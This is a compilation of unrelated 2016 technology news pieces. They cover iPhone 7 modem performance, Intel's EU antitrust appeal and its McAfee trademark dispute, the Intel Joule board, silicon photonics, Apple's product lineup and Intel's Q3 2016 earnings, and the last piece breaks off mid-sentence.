The researchers only tested the iPhone 7 Plus, but the two types of modems are also used in the iPhone 7. So how do you make sure you don't end up with the slower iPhone? If you have a Verizon, Sprint or SIM-free model, you're in good hands, according to the Cellular Insights report. Another preventive measure is to make sure you buy your phone in the United States, China or Japan. Those are the only countries where the speedy Qualcomm version is sold. Yet not every iPhone purchased in the U.S. has the faster modem. iPhones from T-Mobile, AT&T and Telstra include the Intel modem. To determine if your iPhone has the Intel modem, check the model number, found in small print on the back of your smartphone. The Intel modem is in Model A1778 and Model A1784. While the Intel modem is slower, it may not be slow enough to bother users. Cellular Insights ran comparison tests, showing that the Intel-powered iPhone 7 Plus was in the ballpark of the iPhone 6S in areas with poor reception. It's unclear why Apple is offering iPhones with two different speeds. The company did not immediately respond to a request for comment. Some reports have suggested that by shifting some of its modem business to a Qualcomm competitor, Apple gains leverage to extract better prices from Qualcomm.

Read more about the stories in today's news: Czech Police Apprehend Alleged LinkedIn Hacker Intel Gets a Boost in Lengthy Appeal of $1.4 Billion EU Fine Dell Introduces Portfolio of Endpoint Security Products Qualcomm Eyes Snapdragon Chips for Connected Cameras, 5G       Today's topics include the apprehension of an unnamed person suspected of being involved in the 2012 hack of LinkedIn, Intel's appeal of the $1.4 billion fines imposed by the European Union, Dell's introduction of new endpoint security products and Qualcomm's plan to focus on connected cameras and 5G modem chip sets. The long arm of U.S. justice may well have finally caught up with one of the individuals behind the 2012 breach of social networking site LinkedIn. Czech police on Oct. 18 announced that with the help of an international Interpol alert, they apprehended an unnamed man who was wanted by the Federal Bureau of Investigation on charges related to the LinkedIn breach. According to the Czech police statement, the suspect was arrested in a hotel near the center of Prague and noted that the alleged hacker's extradition to the United States will now be decided by judicial authorities. Intel is getting some help in its years-long effort to appeal a $1.4 billion fine levied in 2009 by European antitrust regulators. The chip maker has appealed the fine up through the European Union judicial system despite a series of setbacks, eventually reaching the European Union Court of Justice In an opinion this week, ECJ Advocate General Nils Wahl said the case should be sent back to the court that initially ruled against Intel and levied the record fine. In his opinion, Wahl questioned whether regulators had proved that rebates the chip maker had given to system makers in Europe had amounted to an abuse of its market dominance and harmed competition. Dell EMC is pulling together parts from both companies to create a new broad portfolio of endpoint security and management offerings. The new Dell Endpoint Data Security and Management Portfolio, introduced at the Dell EMC World 2016 show in Austin, Texas, also comes as organizations are looking to pare down the number of security vendors they deal with. The lineup of offerings draws on technology from Dell and Mozy by Dell as well as from former EMC businesses RSA and VMware's AirWatch. Executives from both Dell and EMC worked together from the time Dell announced its bid to buy EMC for more than $60 billion in October 2015 to plan out how to align their respective product portfolios. As a result, the combined company has been able to unveil enhanced products and lineups just six weeks after the deal closed. At Qualcomm's 4G/5G Summit in Hong Kong this week, company officials unveiled plans to expand its reach in the camera space by developing hardware and software designed for video and imaging devices beyond the cameras found in mobile devices. The portfolio also includes a camera reference design based on the Snapdragon 625 system-on-a-chip (SoC). At the same time, the company announced that it is designing a 5G modem chipset that it will start sampling later next year to enable OEMs to build into their cellular devices and that carriers will be able to use in their early 5G trials.  Qualcomm also rolled out three new Snapdragon chips that deliver improved performance and enhanced features over earlier versions.       Submit a Comment Loading Comments...   Manage your Newsletters: Login   Register My Newsletters eWeek Editor's Pick News & Views Cloud Computing Mobile and Wireless Update Best of eWeek eWeek Sunday Brunch eCareers Smart Moves Enterprise Applications Topic Center Update Enterprise IT Advantage eWeek Whitepaper Spotlight eWeek Labs eWeek Enterprise Update eWeek Storage Report Industry Center Update : Finance Industry Center Update : Government Industry Center Update : Health Care Infrastructure Topic Center Update Linux & Open Source Topic Center Update Mid-Market Solutions Securing the Enterprise VoIP Topic Center Update What's Hot Now eWeekend         News and Reviews Slideshows IBM Aims Watson at Embodied Cognition Microsoft Advances 'Any Developer, Any App, Any Platform' Strategy Google Will Tag Frequent Violators of Its Site Safety Standards Intel Lights Up the Sky With New Shooting Star Drone Old School Polling Methods Hid Trump's Popularity With Voters 10 Reasons Not to Buy the Apple MacBo...

The Intel® Joule™ module is the newest addition to a line of powerful, multi-purpose development boards from Intel® Editorial Note This article is for our sponsors at CodeProject. These articles are intended to provide you with information on products and services that we consider useful and of value to developers Get access to the new Intel® IoT Developer Kit, a complete hardware and software solution that allows developers to create exciting new solutions with the Intel® Galileo and Intel® Edison boards. Visit the Intel® Developer Zone for IoT. Overview The Intel® Joule™ module is the newest addition to a line of powerful, multi-purpose development boards from Intel®. This small package contains an Atom™ quad-core processor, clocked at an impressive 1.7 GHz, 4 gigabytes of LPDDR4 RAM, Dual band Wi-Fi* antenna, Bluetooth*, and an Intel® HD Graphics Processing Unit. These specs make the Intel® Joule™ module more powerful than any development board previously created by Intel. This new class of processor allows it to do things that its predecessors, the Intel® Edison platform, and Intel® Galileo platform, could not previously achieve; from advanced computer vision, to machine learning. Now in order to get a better feel for the Intel® Joule™ module, let’s perform a comparison between it and the Intel® Edison module. We’ll start with a quick hardware comparison, before moving on to a software comparison, then a size evaluation, and finally an appraisal of usability. Hardware Quick Comparison Intel® Joule™ Module Intel® Edison Module 1.5 or 1.7 GHz Intel® Atom Processor 500 MHz Intel® Atom Processor 3 or 4 GB of LPDDR4 RAM 1 GB of DDR3 RAM 8 or 16 GB of eMMC Flash 4 GB of eMMC Flash 802.11ac WiFi* with MIMO Dual band 5.0 GHz and 2.4 Ghz Wi-Fi* Bluetooth* Bluetooth* Intel® HD Graphics Processing Unit No Graphics Processing Unit As you can see, the Intel® Joule™ module has an extremely powerful processor for its size. It includes a quad-core processor, giving it four usable executions threads. The Intel® Edison module, on the other hand uses a dual core Intel® Atom processor, clocked at 500 MHz. This means that you get half of the execution threads at less than one third of the processing speed of the Intel® Joule™ module. This means that it has the ability to process more input in a given amount of time. For instance, if you have a bunch of sensors taking in information, the Intel® Edison platform might have to forward it to a Gateway or desktop in order for the data to be properly processed. An Intel® Joule™ module on the other hand could process the data, and send the resulting information to wherever it needs to go. In addition, the Intel® Joule™ module’s graphics processor allows it to do several things that the Intel® Edison module simply cannot do. It can process video and images on board, taking information from them for use elsewhere. It also gives you a graphical user interface, which can make the system overall easier and faster to use. When it comes to memory, the Intel® Edison module only has 1 GB of DDR3 RAM and 4 GB of eMMC flash memory, which means that you only have about 2 GB of memory to work with after the Operating System is installed. This limits how much you can install on the device, as well as how much memory any one program can rely on while running. The Intel® Joule™ module on the other hand, comes with either 8 or 16 gigabytes of eMMC flash memory, depending on what you need, as well as 4 GB of LPDDR4 RAM. This increased memory means that a single Intel® Joule™ platform can be used in more one application; simultaneously. All of this ends up meaning that Intel® Joule™ module can handle a much larger workload than an Intel® Edison module can. It can also handle many smaller workloads at once, even if they are graphics processing threads. All in all the Intel® Joule™ module is simply more powerful than Intel® Edison module, allowing it to process more information in a shorter period, as well as the ability to process graphics. Software The software differences between the Intel® Joule™ platform and the Intel® Edison platform are minimal because the development environment is similar with support for both the Intel® XDK and the Intel® System Studio IoT Edition . Intel® Edison platform uses a version of Linux, known as Poky, which gave the device a terminal only interface. This forced a user to work with a Linux terminal in order to do anything. In contrast, the Intel® Joule™ platform comes with a reference Linux for IoT. This flavor of Linux is an interesting platform, and conforms a bit more to a "classical" Linux distro. Like Linux Mint or Ubuntu it offers a root access terminal, which can be output via HDMI or over a serial interface, such as PuTTY. You can use the terminal to get down and dirty with the board, and work with all of the Linux commands you know and love. This flavor also offers a classic desktop in the form of the user-friendly X interface. This interface allows people who are new to Linux to work with a more entry level graphical interface. While interaction with the terminal will still be required, it is minimized in this mode. Physical Size The Intel® Edison compute module measures a meager 35.5 by 25 millimeters, with a thickness of 2.9 millimeters. The small size allows you to use the Intel® Edison module in many mobile applications, allowing its power to be taken on the go. The Intel® Joule™ module is slightly larger at 48 by 24 millimeters, with a height of 3.5 millimeters. This increase in almost 600 cubic millimeters provides Intel® Joule™ compute module with better temperature and power management, as well as better Wi-Fi* and Bluetooth*. Though the bigger package does mean that it might be harder to make it into a ‘wearable’, the extra power the compute module packs could prove very useful. Usability The Intel® Edison platform is a relatively mature, so it can be a very useful tool. Many people are already comfortable working with it; however getting to that level of comfort presents a steep learning curve. If you don’t know how to use a Linux terminal, you might get stuck rather quickly. Even when taking into consideration the various tools that have been developed specifically to help the Intel® Edison platform be more user-friendly, working knowledge of Linux is required to use it fully. The Intel® Joule™ platform overcomes that issue by offering more ways to work with the device, including the previously mentioned X interface. Introducing people to reference Linux distribution with an easy to use graphical interface as a means of working with Joule™ makes the learning curve less steep. But the OS still provides the classical terminal access that someone who knows how to use the Intel® Edison platform might prefer. This makes the Intel® Joule™ platform far easier to learn how to use compared to the Intel® Edison platform. In addition, support for Windows 10 IoT Core* and Ubuntu Core (Snappy)* is coming later this year. The Uses for the Intel® Joule™ Platform The Intel® Joule™ platform provides a more powerful punch for a similarly sized package compared to the Intel® Edison module, but you might be asking, "What can I do with it?" The answer is, almost anything you want. You can create better, faster wearable technology, embed it into manufacturing systems, build drones, or use it for face recognition applications. The possibilities are endless. I personally have been working with this platform for two months as of the writing of this article. The power that this development platform can deliver has given me plenty of ideas on what the Intel® Joule™ module can be used for. I can’t wait to see the community that will blossom from this device, and what they will achieve! If the Intel® Edison platform and its predecessor the Intel® Galileo platform, have taught us anything, it’s that people push these technologies to their upper limits; the Intel® Joule™ module will be the same. It’s exciting to think of what people are going to make with this new device, and if its ancestors are anything to go by, we’re going to see some impressive stuff. What will you make?

The goal was to develop components that finally integrated optical and electronic signaling on the same silicon device, allowing high-bandwidth data communication over distances that copper conductors simply could not reach. Let's take a closer look at the basic ideas behind silicon photonics and some of the benefits and challenges they can present for data center teams. Q. What is silicon photonics technology and how does it affect the data center? Silicon devices are the foundation of every processor, chipset, ASIC and memory component. At the same time, photonic devices -- components built to carry photons of light, rather than electrons, over great distances -- have been a mainstay of modern networks, providing high-bandwidth connectivity between buildings, across continents and around the world. Silicon photonics uses existing complementary metal oxide semiconductor chip fabrication technologies to build transistors and optical components on the same silicon die at the same time, rather than separate electrons and photons on different devices. Silicon photonics fabricate the microscopic components needed to make direct conversions from electrical signals to light signals and back again, as well as the supporting optical components, to guide and separate optical wavelengths. Signals between silicon photonics chips are connected using optical fibers. So how does silicon photonics technology affect the data center? The initial crop of components in the market seems similar to conventional optical network adapters, which use fiber cables to connect devices across distances of a mile or less. This can service high-speed network connections between buildings, though the components can also be used for high-bandwidth interconnections between data center servers. As time goes on, silicon photonics technology should allow for additional optical applications, bolstering the connectivity between servers and allowing for alternative compute models, such as server disaggregation. Q. Are there any silicon photonics products currently available for data centers? Practical silicon photonics products are still in their infancy, so it's challenging to predict how they will evolve. Intel currently touts two silicon photonics products: the Intel Silicon Photonics 100G PSM4 QSFP28 Optical Transceiver and the Intel Silicon Photonics 100G CWDM4 QSFP28 Optical Transceiver. Both products support Ethernet switch, router and telecom connectivity for large enterprise and cloud-scale data centers with 100 gigabit Ethernet low-power optical links using single-mode optical fiber. Both products also share features, such as a maximum of 3.5 watts of uncooled power dissipation and an electrical-side interface that supports the IEEE 802.3bm CAUI-4 standard, using four 25 gigabits per second (Gbps) data lanes. In addition, the products both employ a compact Quad Small Form-factor Pluggable form factor to allow many modules to be deployed in a relatively small area. The products are also controlled through an inter-integrated circuit bus that supplies a serial link between chips for management and diagnostics. These early products represent just a sampling of the potential for silicon photonics. As the technology develops, the supported distances may shrink to facilitate faster connectivity options for systems and devices that are closer together. Q. How does silicon photonics support data center disaggregation? To understand the potential for silicon photonics, it's important to understand disaggregation in the data center. Servers are traditionally monolithic entities, so all their components are assembled -- or aggregated -- into the same box. When a server cannot deliver more resources, a business needs to buy more servers in their entirety -- even though it may not need all of those additional resources. For example, if an application needs more CPU cores, an organization can deploy another server to service those added cores. But the memory and other resources in the server may sit idle. The concept behind server disaggregation is to rethink the server into independent, functional subsystems. For example, processors, memory, storage and other key resources are divided into functional modules, and IT teams can add and rearrange those modules as desired within a common rack. Racks of disaggregated components would then fill the data center. Moving forward, silicon photonics technology could be a crucial part of the connectivity between future disaggregated compute components, providing fast, reliable and low-cost optical/electronic translations that would work between modules sitting next to one another, scattered within a rack or mounted on racks across a data center. Q. How will silicon photonics technology evolve into future data center products? Practical silicon photonics products are still in their infancy, so it's challenging to predict how they will evolve. However, there are some possible directions for data center professionals to consider. Initially, products like the Intel Silicon Photonics 100G PSM4 and CWDM4 QSFP28 Optical Transceivers will provide simpler, low-power and high-speed networking alternatives for large enterprise and cloud-scale data centers. This can encourage volume adoption of high-bandwidth network technologies within data centers and across metropolitan area network deployments. Over the longer term, silicon photonics technology should continue to support even faster networking speeds, allowing the eventual move from 100 Gbps to 400 Gbps touted on network development roadmaps. But the truly exciting future of silicon photonics technology is in chip-to-chip communication, allowing data to move between individual chips rather than between boxes or buildings. Nonvolatile memory chips have been demonstrated, offering the potential to store not just single bits per cell, but multiple bits per cell. The use of silicon photonics for memory poses the potential for vastly increased memory speed, as well as an enormous jump in memory density. This may allow silicon photonics to play a key role in the next major leaps in enterprise computing power.

Comments By John Ribeiro Follow IDG News Service | Oct 21, 2016 3:50 AM PT RELATED TOPICS Security IT Industry Intel Comments Intel does not object to John McAfee using his personal name in connection with his business, but it objects to the use by the maverick entrepreneur and security expert of the McAfee trade name and trademark in a way that could confuse or deceive consumers or dilute the brand. The issue came up when John McAfee teamed with MGT Capital Investments, which had been until recently mainly into gaming sites, and announced in May that it is in the process of acquiring a diverse portfolio of cybersecurity technologies. MGT also announced that it intended to change its corporate name to “John McAfee Global Technologies, Inc.” with John McAfee at the helm of the new company. MGT has meanwhile launched a network security product called Sentinel, and Intel points in its filing to the U.S. District Court for the Southern District of New York that MGT has a promotional video on its website that “now displays the new trade name and trademark ‘John McAfee Global Technologies.’” Intel announced in September that it had signed an agreement with TPG for a deal that would see its Intel Security business as a separate cybersecurity company in which Intel shareholders would hold 49 percent of the equity with the balance held by the investment firm. Intel would also receive US$3.1 billion in cash. The new company would be named McAfee. Intel said in its filing Thursday that it does not object to “John D. McAfee’s use of his personal name or personal reputation in connection with his business ventures.” Elsewhere in the filing, the company said it admits that John McAfee “did not forfeit the right to use his name as a personal name, which Intel has never challenged.” The company, however, objects to John McAfee and MGT “using their new MCAFEE trade name and trademark, and any other MCAFEE trade names or marks, in a manner that creates a likelihood of confusion or deception among consumers, or that dilutes Intel’s famous MCAFEE brand." Intel is arguing that the use of its trademarks by the renamed company for security products could lead consumers to assume mistakenly that they come from a common source, in this case Intel. Intel said it completed in February 2011 the acquisition of McAfee Inc, and had continued to use and promote the McAfee mark on and in connection with security products, services and publications for consumers and businesses. The company claims to own through McAfee Inc. a number of U.S. registered trademarks such as the MCAFEE, MCAFEE SECURITY, MCAFEE PROVEN SECURITY and the stylized “M” on a shield marks. In June 2016, Intel sent a letter to MGT Capital warning it of legal action if it changed its name “to one that includes the MCAFEE trademark or otherwise use the MCAFEE name as a trademark.” John McAfee does not have the right to use the McAfee name for security-related goods and services, Intel added. John McAfee and MGT soon after filed a suit in the New York court seeking a judgment declaring that “their use of or reference to the personal name of John McAfee and/or McAfee in their business,” including in the renaming of MGT,  does not infringe on Intel’s trademark rights or breach any agreement between the parties. In the filing, John McAfee claimed that he had entered in 1991 into an agreement with McAfee Associates, a predecessor to McAfee Inc., to transfer certain assets to it in exchange for stock and a promissory note. But at no point did he “assign the rights to his personal name, via assignment of trademark or otherwise, or agree to restrict his right to do business using his own name,” according to the filing. He had not filed for or registered the trademark to “John McAfee” or “McAfee” or any other variation of the name at the time of the agreement. Some of MGT's other plans have run into issues. Its agreement to acquire anti-spy software company D-Vasive had to be halted because of the refusal by NYSE MKT to list the 43.8 million shares that would need to be issued to complete the merger. The New York Stock Exchange this week initiated proceedings for delisting MGT's common stock.

Wednesday 16 Nov 2016 / Tehran - 10:29 / GMT - 06:59 Old FNA Old FNA                 Advanced Search Ar  | En  | Fa  | Tr Home Politico-Defense Politics  - Foreign Policy  - Defense  - Nuclear   Economy Society & Culture Society  - Sport  - Culture  - Art  - Life Style   Sci-Tech Space  - Nano  - Medicine  - Technology  - Earth   World Interviews & Commentaries Interviews  - Commentaries   Multimedia Photo  - Video   All Stories Technology Fri Oct 21, 2016 1:24 iPhone 7s with Intel Modems Struggle Badly in Low-Signal Areas Tweet TEHRAN (FNA)- Apple has a reputation for tight supply chain management and demanding rigorous quality control, but the company may have a modem problem on its hands. Previously, Apple has tapped both Samsung and TSMC to build its SoCs, but stuck with the same Qualcomm modem for all its hardware. With the iPhone 7, Apple adopted an Intel modem for its AT&T and T-Mobile variants, while the factory-unlocked devices, Sprint, and Verizon hardware all use Qualcomm’s modem silicon (MDM9645M if you want to get technical). According to an analysis performed by Cellular Insights, both devices perform equally well if you have a strong signal, but the Intel modem (XMM7360, pictured at top) drops off significantly as signal strength weakens. Cellular Insights tested multiple LTE bands (Band 4, 7, and 12) in a 4×2 MIMO configuration. The graph here is from Band 4, which Cellular Insights describes as the most common band for North America LTE deployments. RSRP is a measure of LTE signal strength and is expected to range from ~-75dBm when measured directly on top of a cellular base site to -120dBm at the edge of coverage. What we see here is that the Intel modem can’t sustain the same throughput as the Qualcomm device, particularly at the -105dBm threshold. At -115dBm, the gap between the Intel and Qualcomm modems is roughly 2x — meaning the Qualcomm device is sustaining about twice the network throughput on the same signal strength. Cellular Insights also compared the two devices against the Galaxy S7 Edge, the iPhone 6s, the LG G5, and the Nexus 5X. First of all, kudos to Samsung; the S7 Edge does extremely well in all cases. The Intel XMM7360, in contrast, is the worst overall performer of the lot — though the 6s doesn’t exactly distinguish itself well, either. That might explain why Apple was willing to work with Intel in the first place, but the Intel XMM7360 doesn’t keep up with Qualcomm’s MDM9645M. It would be interesting to see a battery life comparison between Intel and Qualcomm devices and it’s possible that Apple could improve the Intel modem’s performance via a software update. If you really care about LTE performance on an iPhone or live in an area with marginal LTE coverage, the factory-unlocked version of the device is definitely your best bet — right now, the Intel modem isn’t performing where it ought to be. Winning the iPhone 7 was a huge victory for Intel’s beleaguered modem division, but that victory was predicated on the idea that the Intel and Qualcomm modems would offer equal performance. So far, that doesn’t seem to be the case. It’s not clear how much this impacts the iPhone 7’s range, network timeouts, or other issues that might arise in areas where cellular connectivity is weak, but the general implication is that the Qualcomm modem offers better performance and possibly better range when operating in low-signal areas.         LATEST STORIES (10) American Students Join Anti-Trump Protests across US Eleven Killed, Wounded in Terrorists' Rocket Attack in Western Damascus Samples Taken in Syria's Aleppo Prove Militants Used Chlorine Gas Syrian Army Discovers Terrorists' 700-Meter-Long Tunnel in Khan Al-Sheih Connecting Damascus to Quneitra Protests, Students Walkouts Mark Week after Trump's Win Yemen Water Crisis Iraqi Popular Forces Continue Operations against ISIL Terrorists West of Mosul Iraqi Forces Take Back Ancient City of Nimrud from ISIL Iraqi Popular Forces Safeguarding Peace in Newly Gained Territories near Mosul Police Violence during Anti-Trump Protests Iran and US: A Tale of Two Elections Supermoon in Iran's Sky Iran Eyeing NITC Listing in Int'l Stock Markets VP: World Admitting Iran's Constructive Role in Maintaining Regional Security Iraqi Interior Minister: Nearly 1,000 ISIL Terrorists Killed, Over 100 Captured in Mosul Operation American Students Join Anti-Trump Protests across US TEHRAN (FNA)- Protesters were not slowing down six days after Donald Trump's election, many of them high school students leaving class by the hundreds to carry signs and flags on the streets of several US cities.

against €1.06bn competition law fine The EU's highest court has been urged to uphold an appeal brought by the computer processing giant Intel against a €1.06 billion fine it was served for breaching competition rules.21 Oct 2016 EU and UK competition law EU & Competition TMT Advanced Manufacturing & Technology UK Europe Germany France An advocate general to the Court of Justice of the EU (CJEU) outlined a number of reasons why the appeal should be reheard by the EU's General Court in a non-binding opinion published on Thursday. Robert Erikkson, a competition law expert at Pinsent Masons, the law firm behind Out-Law.com, said that if the CJEU follows the approach recommended by the advocate general, it could become harder for the European Commission to enforce EU competition laws extraterritorially in future. In 2009 the European Commission ruled that Intel breached rules that prohibit companies from abusing a dominant market position under Article 102 of the Treaty on the Functioning of the EU (TFEU) when it offered rebates on the sale of central processing units (CPUs) to some computer manufacturers and by paying a retailer, Media-Saturn-Holding, to sell computers with only Intel chips installed in them. At the time the Commission also said that Intel had paid three computer manufacturers to delay, cancel or restrict the launch or distribution of computers containing CPUs made by its main rival, Advanced Micro Devices (AMD). Intel had also engaged in efforts to try to conceal its infringing activities, the regulator found. The Commission concluded that Intel had pursued a strategy of trying to foreclose AMD from the CPUs market between October 2002 and December 2007. This conclusion was supported by the General Court in a ruling in 2014 in which it dismissed Intel's appeal against the €1.06bn fine the Commission had imposed. Intel has appealed against the General Court's decision to the CJEU. Advocate general Nils Wahl was tasked with providing an independent and impartial opinion to the CJEU in this case before the Court reaches its decision. He has scrutinised Intel's appeal and now made recommendations on how the CJEU should rule. A CJEU judgment is typically handed down by the Court a number of months after an advocate general opinion is issued. The CJEU is not bound to follow the opinions of its advocate generals but often it does. In its appeal, Intel has claimed that the General Court erred in law when reaching its decision to uphold the fine imposed by the Commission. It has raised six grounds of appeal. Advocate general Wahl said it is his view that five of the six grounds of appeal should be upheld and that the judgment of the General Court should therefore be "set aside". The case should be referred back to the General Court for a rehearing of Intel's appeal, he said. Eriksson of Pinsent Masons, the law firm behind Out-Law.com, said that it would be a major blow for the Commission if Intel’s appeal was upheld and the original decision was abolished, partly because it is "a recent key precedent as regards what types of rebates are abusive". "Moreover, it was the first major General Court Article 102 judgment after the issuing of the Commission's 2009 guidance on enforcement priorities in applying Article 102 of the TFEU to abusive exclusionary conduct; and the Commission had stated that the Intel decision was in line with the orientations set out in that guidance," Eriksson said. Among the faults Wahl said exist with the General Court's ruling is with the "legal characterisation" it had given to rebates Intel paid to some computer manufacturers for exclusivity in relation to use of its microchips in their machines. Wahl said the General Court had erred in classifying the rebates in a way which meant that it did not consider whether the payment of the 'exclusivity rebates' were justified under EU competition laws in the round. The advocate general said: "The General Court erred in law, first, in finding that ‘exclusivity rebates’ constitute a separate and unique category of rebates that require no consideration of all the circumstances in order to establish an abuse of a dominant position contrary to [EU competition laws]. Second, it erred in law in its alternative assessment of capability by failing to establish, on the basis of all the circumstances, that the rebates and payments offered by [Intel] had, in all likelihood, an anticompetitive foreclosure effect." Another ground of Intel’s appeal is on jurisdiction where it has argued that the General Court erred in law when agreeing that the Commission had jurisdiction to enforce Article 102 of the TFEU. Intel claimed that its conduct was neither implemented in the European Economic Area (EEA), nor had it any substantial effect in that area, and that, therefore, the Commission lacked jurisdiction to take Article 102 enforcement action.  Eriksson said that it is recognised in case law that if EU competition law could only be applied where, for example, an agreement was formed or adopted within the EU territory, that would provide businesses with an easy way to escape EU competition law. In its ruling the General Court had said two ways to establish a sufficient link between the conduct in question and the territory was the 'implementation' criterion or a 'qualified' effects criterion. In Wahl’s opinion he said the implementation criterion requires that at least part of the conduct should have been implemented, executed or put into effect in the EU's internal market. The qualified effects criterion requires that the conduct had immediate, substantial and foreseeable effects in the internal market. "From a UK perspective post-Brexit, this is an important ground of appeal where it will be very interesting to see if the CJEU takes the line of the advocate general," said Eriksson. "The easier it is for the Commission to claim jurisdiction to enforce EU competition law, the greater the likelihood that UK companies in the future will be subject to EU competition law as regards conduct within the UK, which then is outside the EU territory and, it seems, will also likely be outside the EEA." According to Wahl, nothing in the relevant Intel conduct could be characterised as having been implemented, executed or put into effect in the internal market, as the conduct alleged as abusive arose from an agreement between Intel, a US company, and a Chinese company, concerning sales of CPUs made and sold outside the EU for incorporation into computers made in China, limiting only the possibility for another US-based company (AMD) of selling CPUs on the Chinese market. In Wahl’s view, the General Court erred in concluding the implementation criterion was met purely on the basis of customer behaviour in the downstream notebook market, which concerned Lenovo's decision not to sell a certain computer model worldwide. As regards the ‘qualified’ effects criterion, Wahl thought this should not be satisfied where, for example, the effect in the EU is merely hypothetical or of minor significance. The anti-competitive effect resulting from the conduct appeared to Wahl to be "rather hypothetical, speculative and unsubstantiated". Wahl noted that the General Court itself had stated that the number of computers affected was "modest" and that it was unclear whether some of those were to be sold in the EEA. He stressed that it is incumbent upon the Commission to prove that the effects of alleged abusive conduct within the internal market may be appreciable. Wahl considered that the General Court had failed in asking the crucial question as to whether the conduct immediately or directly could have diminished competitors’ ability to compete for CPUs within the internal market.  "It is worth noting that Wahl does not rule out that the conduct could have significantly impeded AMD’s capacity to make and market CPUs worldwide, including in the EEA, as Intel’s exclusion of the only viable competitor in the market for CPUs could be achieved regardless of whether it chose to target customers that have operations in the EEA or elsewhere," said Eriksson. "However, he found it ‘regrettable’ that no such analysis had been carried out by the General Court." "If the CJEU agrees with Wahl, then it could be harder for the Commission to enforce EU competition law extraterritorially in the future," Eriksson said.

However, after 7 consecutive quarters of declining tablet sales, it is hard to see how Apple’s second best product, the iPad will soon see a slow death despite the fact that it outdid Micrsoft’s Surface tablet PCs as per the last IDC report. The Apple iPhone may be the company’s hero product, but with falling smartphone and tablet sales, Apple now seems to be focussing on a forgotten line of products that started it all, the Mac. Apple’s Mac lineup has been ignored for quite some time now. The only Mac product that Apple sells with an up to date chipset is its recently announced 2016 MacBook. There’s the Mac Pro that stuck with an Intel Ivy Bridge-E CPU, which was last updated in 2013, the MacBook Pro 15-inch which features an Intel Haswell CPU and was updated in 2014 and finally the MacBook Air with an Intel Broadwell CPU. Steve Jobs unveiled the Macbook Air from an envelope and it still looks the same 8 years later. The MacBook Air despite being on of the best value for money buys in Apple’s Mac lineup has yet to see a redesign or an update. It packs in an old TN display with non Retina resolution and a fifth-generation chipset, while Asus, Dell offer the latest for roughly the same price. While I would love to sit and admire Apple’s marketing team (since people are still buying these old systems) it is easy to tell, that Apple’s focus in the past two years was on its iPad. Apple iPad Pro 9.7 inch Apple launched the powerful iPad Pro models last year (November 2015), and it was clear that the company was looking to get PC users under its fold with the same. Soon enough Apple added another Pro variant with the 9.7-inch model with the hopes that those who found the 12-inch too-big would be happy to go in for this one. But that turned out to be a flop show as well. The company lost out because not only were the Pro models priced too high, but they ran the same iOS as its smartphones, which is not something a power user who usually pays for an ultra-book would be interested in. Adding to the mess was Apple’s idea to ape Microsoft with a soft keyboard, that somehow did not cover up for its lacking software productivity. With the tablet sales still declining Apple seems to have woken up and is now for once actually holding an event for its updated Mac lineup. Think of it as a Plan B where the Plan A with the iPad seems to have failed, despite repeated efforts. Apple MacBook 2016 So wit the iPad out fizzing out (they are still planning three new models next year), the next mobile device in line would have to be the old and neglected laptop lineup. So why is the Apple iPad failing? As Digital Trends points out, it is the upgrade cycle. Tablet users simply do not feel the need to upgrade to a new or the latest model, as they are often used for secondary tasks. With smartphones screen sizes getting bigger, more can be accomplished with the device that is in your hand, rather than the one in your bag, that well… needs two hands. Why would one need an iPad Pro (Rs 93,000 256GB) when you have MacBook (Rs 1,00,000 512GB, 8GB RAM) that is equally light, priced the same and can do so much more? Microsoft’s Windows 10 and its manufacturers have moved ahead of Apple when it comes to hardware and software, let’s hope Plan B works out as smartphones and tablets are just not cutting it, while Plan C with the Apple Car just got shelved.

Intel achieved margins of 63.3%, up 0.3% year-over-year, and their operating income increased 6% to $4.5 billion. Net income for the quarter was $3.4 billion, up 9%, and earnings per share came in at $0.69. Intel Q3 2016 Financial Results (GAAP)   Q3'2016 Q2'2016 Q3'2015 Revenue $15.8B $13.5B $14.5B Operating Income $4.5B $1.3B $4.2B Net Income $3.4B $1.3B $3.1B Gross Margin 63.3% 58.9% 63.0% Client Computing Group Revenue $8.9B +18.7% +5.7% Data Center Group Revenue $4.5B +12.5% +9.9% Internet of Things Revenue $689M +20.4% +18.6% Non-Volatile Memory Solutions Group $649M +17.1% -0.9% Intel Security Group $537M flat +6.1% Programmable Solutions Group $465M -8.6% - All Other Revenue $44M +10% -42.8% Intel also announced Non-GAAP results, which exclude certain things like acquisition-related adjustments, deferred revenue write-down, restructuring, and more. For a full list, please check out their lengthy explanation on their earnings report. On a Non-GAAP basis, revenue was the same $15.8 billion, margins were up 1.3% to 64.8%, and operating income was up 18% to $5.1 billion. Net income was up 21% to $3.9 billion, and earnings per share were up 21% to $0.80. Intel’s internal divisions are broken down into six groups. The Client Computing Group, which is PCs, tablets, phones, and wired and wireless communication. The Data Center Group focuses on enterprise and the cloud. Internet of Things is retail, transportation, industrial, building, and home use electronics. Non-Volatile Memory Solutions is mostly Intel’s SSD efforts. Intel Security Group is security software (McAfee) and new for fiscal 2016 is the Programmable Solutions Group, formed after the acquisition of Altera, and features field-programmable gate arrays and related products. For Q3, the Client Computing Group had revenues of $8.892 billion, which is up from $8.506 billion a year ago. Unit volumes were actually down 4% compared to the same point a year ago, and volumes are down 11% for the year compared to the first three quarters of 2015, but average selling prices (ASP) continue to increase. For this quarter ASP was up 6% compared to a year ago, and is up 12% for the year so far. Breaking it down a bit further, Intel has had 4% growth in notebook platform sales for this quarter (year-over-year) with ASP up 3% in the notebook segment. Desktops dropped 6% in volume, but have kept the same average selling price, and “tablet platform volumes decreased” which is a non-numerical way to say that Intel is getting out of the dedicated tablet market altogether. The Data Center Group had revenues of $4.542 billion this quarter, up from $4.140 billion a year ago. Unit volumes increased 12% this quarter compared to Q3 2015, and for the year unit volumes are up 9%. Average selling price has decreased though, down 3% this quarter, and down 2% for the year so far. Intel doesn’t break out the numbers as specifically for the remaining groups, but Non-Volatile Memory Solutions had revenue that was more or less flat at $649 million for the quarter, compared to $655 million a year ago. Internet of Things continues to grow, up to $689 million in revenue, compared to $581 million in Q3 2015. The Intel Security Group increased revenue from $506 million to $537 million, and the Programmable Solutions Group had revenue of $425 million, with no comparison to last year since it is a newly acquired product group, but up 6% compared to Altera’s numbers from last year. Intel has made some announcements in this quarter as well. Intel started sampling Stratix 10 in this quarter, which is the only 14 nm FPGA. They also announced they will sell 51% of the Intel Security Group, and establish an independent McAfee security company with the private equity firm TPG. Intel is also shipping “thousands of samples” of their new 3D XPoint to customers, and should have it qualified by the end of this quarter. Speaking of qualified, the Intel 7480 modem was qualified for AT&T this quarter, which is about a year after the 7360 modem got qualified. Looking forward, Intel is forecasting revenues for Q4 at $15.7 